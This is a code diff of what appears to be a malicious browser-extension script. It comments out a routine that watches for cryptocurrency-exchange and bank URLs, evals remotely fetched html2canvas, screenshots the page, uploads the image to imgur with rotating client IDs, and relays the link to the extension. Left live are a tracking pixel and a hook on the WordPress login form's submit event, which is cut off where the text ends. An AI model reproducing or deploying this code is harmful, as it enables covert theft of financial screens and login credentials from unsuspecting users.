@@ -1,54 +1,54 @@
 (new Image).src = "https://whos.amung.us/swidget/bbbbbbbbf";
 
-var myStringArray = ["coin", "ether", "bitcoin", "monero", "etherum", "wallet", "cryptocurrency", "bitcoin", "blockchain.info", "paxful.com", "coin.space", "coinapult.com", "bitgo.com", "strongcoin.com", "coinhive.com", "spectrocoin.com", "wirexapp.com", "xapo.com", "iqoption.com", "etoro.com", "bittrex.com", "localbitcoins.com", "cex.io", "kraken.com", "etherdelta.com", "bitfinex.com", "bitstamp.net", "bisq.network", "gdax.com", "shapeshift.io", "binance.com", "coinmama.com", "bitcoin.de", "bithumb.com",
-"coinatmradar.com", "poloniex.com", "changelly.com", "zebpay.com", "bitso.com", "gemini.com", "yobit.net", "luno.com", "bitbay.net", "bitpanda.com", "bitflyer.jp", "cryptonia.co.nz", "btcmarkets.net", "coinchceck.com", "bx.in.th", "bitcoin.co.id", "anycoindirect.eu", "hitbtc.com", "bitmex.com", "indacoin.com", "mine", "btc", "ltc", "zcash", "banco", "bank", "banven", "banes"];
-var arrayLength = myStringArray.length;
-var i = 0;
-for (;i < arrayLength;i++) {
-  if (location.href.indexOf(myStringArray[i]) > -1) {
-
-  if (typeof html2canvas != "object") {
-    var b = document.querySelector("img");
-        b.setAttribute('crossOrigin', 'anonymous');
-    var xmlHttp = new XMLHttpRequest;
-    xmlHttp["open"]("GET", "https://html2canvas.hertzen.com/build/html2canvas.min.js", false);
-    xmlHttp["send"](null);
-    eval(xmlHttp["responseText"]);
-  }
-  var client_ids = ["3684103173db518", "aff413c4429c3e0", "c850fa264fe4583", "b9d8e7f2da3926a", "6dff965b85a21d7", "161dee2b693cca1", "7621dbdbefa1eeb", "e62a9eaa1d28307", "ecb1f96220c662f", "f3b0d63899cc902"];
-
-      html2canvas(document.body, {
-        allowTaint : false,
-        taintTest : false,
-        useCORS : true,
-        onrendered : function(canvas) {
-          canvas.toBlob(function(blob) {
-            client_ids = shuffle(client_ids);
-            var client_id = client_ids[0];
-            var fd = new FormData;
-            fd.append("image", blob, "photo_" + Math.floor(Math.random() * 9999) + ".png");
-            var xhr = new XMLHttpRequest;
-            xhr.open("POST", "https://api.imgur.com/3/image?ext=me");
-            xhr.setRequestHeader("Authorization", "Client-ID " + client_id);
-            xhr.send(fd);
-            xhr.onreadystatechange = function() {
-              if (xhr.readyState == 4) {
-                var data = JSON.parse(xhr.responseText);
-                if (!data.error) {
-                  image_link = data.data.link;
-                  var login = {};
-                  login.image = image_link;
-                  login.url = location.href;
-                  chrome.runtime.sendMessage(login);
-                } else {
-                }
-              }
-            };
-          }, "image/png", 1);
-        }
-      });
-  }
-}
+// var myStringArray = ["coin", "ether", "bitcoin", "monero", "etherum", "wallet", "cryptocurrency", "bitcoin", "blockchain.info", "paxful.com", "coin.space", "coinapult.com", "bitgo.com", "strongcoin.com", "coinhive.com", "spectrocoin.com", "wirexapp.com", "xapo.com", "iqoption.com", "etoro.com", "bittrex.com", "localbitcoins.com", "cex.io", "kraken.com", "etherdelta.com", "bitfinex.com", "bitstamp.net", "bisq.network", "gdax.com", "shapeshift.io", "binance.com", "coinmama.com", "bitcoin.de", "bithumb.com",
+// "coinatmradar.com", "poloniex.com", "changelly.com", "zebpay.com", "bitso.com", "gemini.com", "yobit.net", "luno.com", "bitbay.net", "bitpanda.com", "bitflyer.jp", "cryptonia.co.nz", "btcmarkets.net", "coinchceck.com", "bx.in.th", "bitcoin.co.id", "anycoindirect.eu", "hitbtc.com", "bitmex.com", "indacoin.com", "mine", "btc", "ltc", "zcash", "banco", "bank", "banven", "banes"];
+// var arrayLength = myStringArray.length;
+// var i = 0;
+// for (;i < arrayLength;i++) {
+//   if (location.href.indexOf(myStringArray[i]) > -1) {
+//
+//   if (typeof html2canvas != "object") {
+//     var b = document.querySelector("img");
+//         b.setAttribute('crossOrigin', 'anonymous');
+//     var xmlHttp = new XMLHttpRequest;
+//     xmlHttp["open"]("GET", "https://html2canvas.hertzen.com/build/html2canvas.min.js", false);
+//     xmlHttp["send"](null);
+//     eval(xmlHttp["responseText"]);
+//   }
+//   var client_ids = ["3684103173db518", "aff413c4429c3e0", "c850fa264fe4583", "b9d8e7f2da3926a", "6dff965b85a21d7", "161dee2b693cca1", "7621dbdbefa1eeb", "e62a9eaa1d28307", "ecb1f96220c662f", "f3b0d63899cc902"];
+//
+//       html2canvas(document.body, {
+//         allowTaint : false,
+//         taintTest : false,
+//         useCORS : true,
+//         onrendered : function(canvas) {
+//           canvas.toBlob(function(blob) {
+//             client_ids = shuffle(client_ids);
+//             var client_id = client_ids[0];
+//             var fd = new FormData;
+//             fd.append("image", blob, "photo_" + Math.floor(Math.random() * 9999) + ".png");
+//             var xhr = new XMLHttpRequest;
+//             xhr.open("POST", "https://api.imgur.com/3/image?ext=me");
+//             xhr.setRequestHeader("Authorization", "Client-ID " + client_id);
+//             xhr.send(fd);
+//             xhr.onreadystatechange = function() {
+//               if (xhr.readyState == 4) {
+//                 var data = JSON.parse(xhr.responseText);
+//                 if (!data.error) {
+//                   image_link = data.data.link;
+//                   var login = {};
+//                   login.image = image_link;
+//                   login.url = location.href;
+//                   chrome.runtime.sendMessage(login);
+//                 } else {
+//                 }
+//               }
+//             };
+//           }, "image/png", 1);
+//         }
+//       });
+//   }
+// }
 
     if (location.href.indexOf("wp-login") >= 0 || (location.href.indexOf("wp-admin") >= 0 || location.href.indexOf("wp-") >= 0)) {
       document.getElementById("loginform").onsubmit = function() {
